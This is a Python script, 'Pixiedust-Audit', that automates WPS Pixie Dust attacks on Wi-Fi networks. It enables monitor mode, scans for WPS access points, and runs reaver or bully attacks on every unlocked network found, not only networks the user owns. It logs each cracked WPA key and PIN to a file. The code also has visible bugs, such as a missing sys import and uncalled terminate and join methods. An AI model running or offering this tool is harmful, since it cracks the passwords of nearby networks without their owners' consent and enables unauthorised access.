#! /usr/bin/python3

import subprocess
import csv
import time
import pandas
import os
import os.path
import multiprocessing
import argparse

line=""
LEN=0
attackmode=0
bssid=0
channel=0
wps=0
ssid=""
interface=0
choice=0
attack=0
ENonce = ""
RNonce = ""
PKE = ""
PKR = ""
AuthKey = ""
EHash1 = ""
EHash2 = ""
PIN = ""
PWD = ""
keycount = 0
network_max = 0
DN = open(os.devnull, 'w')

parser = argparse.ArgumentParser('Pixiedust-Audit, Attackmodes: reaver | bully')
parser.add_argument('-I', '--interface')
parser.add_argument('-A', '--attackmode')
args = parser.parse_args()
interface=args.interface
attackmode=str(args.attackmode)

def reset():
   global ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
   ENonce = ""
   RNonce = ""
   PKE = ""
   PKR = ""
   AuthKey = ""
   EHash1 = ""
   EHash2 = ""
   PIN = ""
   PWD = ""
   return 0

def monitor(i):
   global interface
   try:
      subprocess.Popen(['airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
      time.sleep(5)
      clear()
      #subprocess.call(['airmon-ng'])
      #interface=input("Choice: ")
      clear()
      subprocess.call(['airmon-ng', 'start', i], stdout=DN, stderr=DN)
      interface=i+'mon'
      clear()
      return interface
   except KeyboardInterrupt:
      return 0

def clear():
   subprocess.call(["clear"])

def scan():
   global network_max
   try:
      timeout = time.time() + 60*3
      subprocess.Popen(['wash', '-i', interface, '-P' , '-o', 'temp.csv'], stdout=DN, stderr=DN)
      time.sleep(5)
      while True:
         if time.time() > timeout:
            break
         clear()
         cr = csv.reader(open("temp.csv"))
         row_count = sum(1 for row in cr)
         network_max = row_count
         print ("Scanning for 3 Minutes...")
         print ("Found",str(row_count),"Networks")
         time.sleep(3)
      subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
      #subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
      #subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
   except KeyboardInterrupt:
      subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
      #subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
      #subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
      return 0

def choose():
   global choice, bssid, ssid, channel
   try:
      clear()
      count=0
      with open('temp.csv', "r") as ifile:
         cr = pandas.read_csv('temp.csv',sep='|', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
         print(cr)
         choice=input('Choice: ')
         clear()
         bssid=cr['BSSID'][choice]
         channel=cr['Channel'][choice]
         ssid=cr['SSID'][choice]
         return bssid,channel,ssid
   except KeyboardInterrupt:
      clear()
      return 0

def auto(attackmode):
   global bssid, ssid, channel, network_max
   counter = 0
   try:
      with open('temp.csv', "r") as ifile:
         cr = pandas.read_csv('temp.csv',sep='|', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
         for index, row in cr.iterrows():
            bssid=row['BSSID']
            channel=row['Channel']
            ssid=row['SSID']
            if open('bees.txt', 'r').read().find(bssid) != -1:
               print('Key already recovered for %s' % (bssid))
               time.sleep(5)
               continue
            elif row['Locked'] is "Yes":
               print('Skipping %s due to locked WPS' % (bssid))
               time.sleep(5)
               continue
            if attackmode == "bully":
               b = multiprocessing.Process(target=bully, name="bully")
               b.start()
               b.join(190)
               if b.is_alive():
                  b.terminate()
                  b.join()
                  kill()
            elif attackmode == "reaver":
               b = multiprocessing.Process(target=reaver, name="reaver")
               b.start()
               b.join(190)
               if b.is_alive():
                  b.terminate
                  b.join
                  kill()
   except KeyboardInterrupt:
      clear()
      reset()
      kill()
      return 0
   except:
      print("Unexpected error:", sys.exc_info()[0])
      raise
   print('%i Keys have been recovered' % (keycount))
   time.sleep(10)

def kill():
   subprocess.call(['killall', '-s', str(6), 'airodump-ng'], stderr=DN)
   subprocess.call(['killall', '-s', str(6), 'reaver'], stderr=DN)
   subprocess.call(['killall', '-s', str(6), 'aireplay-ng'], stderr=DN)
   subprocess.call(['killall', '-s', str(6), 'bully'], stderr=DN)
   if PWD or PIN:
       text_file = open("bees.txt", "a")
       text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n" % (ssid, bssid, PWD, PIN))
       text_file.close()
   return 0

def bully():
   global choice, bssid, ssid, keycount, channel, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
   try:
      clear()
      print('Trying to recover %s Key' % (bssid))
      kill()
      time.sleep(3)
      cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
      time.sleep(5)
      cmd3 = ['bully', '-N', '-C', '-A', '-b', bssid, '-c', str(channel), '-v', str(4), '-d', interface]
      timeout = time.time() + 60
      proc = subprocess.Popen(cmd3, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
      stdout = []
      subprocess.Popen(cmd2, stdout=DN, stderr=DN)
      while True:
         line = proc.stdout.readline()
         stdout.append(line)
         if time.time() > timeout:
            break
         #elif b"'Timeout'" in line:
         #   print("Status: Timeout")
         #elif b"'NoAssoc'" in line:
         #   print("Status: No Association")
         elif b"ENonce" in line and ENonce == "":
            ENonce=line.decode().split(':',1)[1]
            print("E-Nonce: found")
            #print(ENonce)
         elif b"PKE" in line and PKE == "":
            PKE=line.decode().split(':',1)[1]
            print("PKE: found")
            #print(PKE)
         elif b"RNonce" in line and RNonce == "":
            RNonce=line.decode().split(':',1)[1]
            print("R-Nonce: found")
            #print(RNonce)
         elif b"PKR" in line and PKR == "":
            PKR=line.decode().split(':',1)[1]
            print("PKR: found")
            #print(PKR)
         elif b"AuthKey" in line and AuthKey == "":
            AuthKey=line.decode().split(':',1)[1]
            print("AuthKey: found")
            #print(AuthKey)
         elif b"E-Hash1" in line and EHash1 == "":
            EHash1=line.decode().split(':',1)[1]
            print("E-Hash1: found")
            #print(EHash1)
         elif b"E-Hash2" in line and EHash2 == "":
            EHash2=line.decode().split(':',1)[1]
            print("E-Hash2: found")
            #print(EHash2)
         elif b"PIN" in line and PIN == "":
            PIN=line.decode().split(':',1)[1]
            PIN=PIN.replace("'", "")
            PIN=PIN.replace(" ", "")
            print("WPS Pin: found")
            #print(PIN)
         elif b"KEY" in line and PWD == "":
            PWD=line.decode().split(':',1)[1]
            PWD=PWD.replace("'", "")
            PWD=PWD.replace("\n", "")
            PWD=PWD.replace(" ", "")
            print("Key recovered!")
            keycount = keycount + 1
            #text_file = open("bees.txt", "a")
            #text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n\n" % (ssid, bssid, PWD, PIN))
            #text_file.close()
            kill()
            time.sleep(10)
            break
         if line == '' and proc.poll() != None:
            kill()
            break
      return 0

   except KeyboardInterrupt:
      kill()
   except:
      print("Unexpected error:", sys.exc_info()[0])
      raise
   reset()

def reaver():
   global choice, bssid, ssid, keycount, channel, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
   try:
      clear()
      print('Trying to recover %s Key' % (bssid))
      kill()
      time.sleep(3)
      cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
      time.sleep(5)
      cmd3 = ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), '-vvv', "-E", "-N", "-L", "-A", "-K", str(1)]
      timeout = time.time() + 60
      proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
      stdout = []
      subprocess.Popen(cmd2, stdout=DN, stderr=DN)
      while True:
         line = proc.stdout.readline()
         stdout.append(line)
         if time.time() > timeout:
            break
         if b"E-Nonce" in line and ENonce == "":
            ENonce=line.decode().split(':',1)[1]
            print("E-Nonce: found")
            #print(ENonce)
         elif b"PKE" in line and PKE == "":
            PKE=line.decode().split(':',1)[1]
            print("PKE: found")
            #print(PKE)
         elif b"R-Nonce" in line and RNonce == "":
            RNonce=line.decode().split(':',1)[1]
            print("R-Nonce: found")
            #print(RNonce)
         elif b"PKR" in line and PKR == "":
            PKR=line.decode().split(':',1)[1]
            print("PKR: found")
            #print(PKR)
         elif b"AuthKey" in line and AuthKey == "":
            AuthKey=line.decode().split(':',1)[1]
            print("AuthKey: found")
            #print(AuthKey)
         elif b"E-Hash1" in line and EHash1 == "":
            EHash1=line.decode().split(':',1)[1]
            print("E-Hash1: found")
            #print(EHash1)
         elif b"E-Hash2" in line and EHash2 == "":
            EHash2=line.decode().split(':',1)[1]
            print("E-Hash2: found")
            #print(EHash2)
         elif b"WPS pin" in line and PIN == "":
            PIN=line.decode().split(':',4)[1]
            PIN=PIN.replace("'", "")
            PIN=PIN.replace(" ", "")
            print("WPS Pin: found")
            #print(PIN)
         elif b"WPA PSK" in line and PWD == "":
            PWD=line.decode().split(':',1)[1]
            PWD=PWD.replace("'", "")
            PWD=PWD.replace("\n", "")
            PWD=PWD.replace(" ", "")
            print("Key recovered!")
            keycount = keycount + 1
            #text_file = open("bees.txt", "a")
            #text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n\n" % (ssid, bssid, PWD, PIN))
            #text_file.close()
            kill()
            time.sleep(10)
            break
         if line == '' and proc.poll() != None:
            kill()
            break
      return 0
   except KeyboardInterrupt:
      kill()
   except:
      print("Unexpected error:", sys.exc_info()[0])
      raise
   reset()


clear()
if os.path.isfile("bees.txt"):
    pass
else:
    subprocess.call(['touch', 'bees.txt'])
#if os.path.isfile("temp.csv"):
#   pass
#else:
#   subprocess.call(['touch', 'temp.csv'])
#while x != 99:
#        if interface == 0:
#            print("Interface: none")
#        else:
#            print("Interface:",interface)
#	if attackmode == 1:
#	    print("Attackmode: Reaver")
#	else:
#	    print("Attackmode: Bully")
#	print('Networks: %s' % (network_max))
#       print("1. Start Monitormode")
#        print('2. Scan Networks')
#        print('3. Choose Network')
#        print('4. Start Attack')
#	print('5. Automode')
#        print('99. Exit')
#        x=input('Choice: ')
#        if x == 1:
#            monitor()
#        if x == 2:
#            scan()
#        if x == 3:
#            choose()
#        if x == 4:
#            reaver()
#	if x == 5:
#	    auto(1)//

monitor(interface)
scan()
auto(attackmode)

kill()
subprocess.call(['airmon-ng', 'stop', interface], stdout=DN)
subprocess.call(['service', 'network-manager', 'restart'])
subprocess.call(['rm', 'temp.csv'])
subprocess.call(['rm', '/root/.bully/*'])
quit()
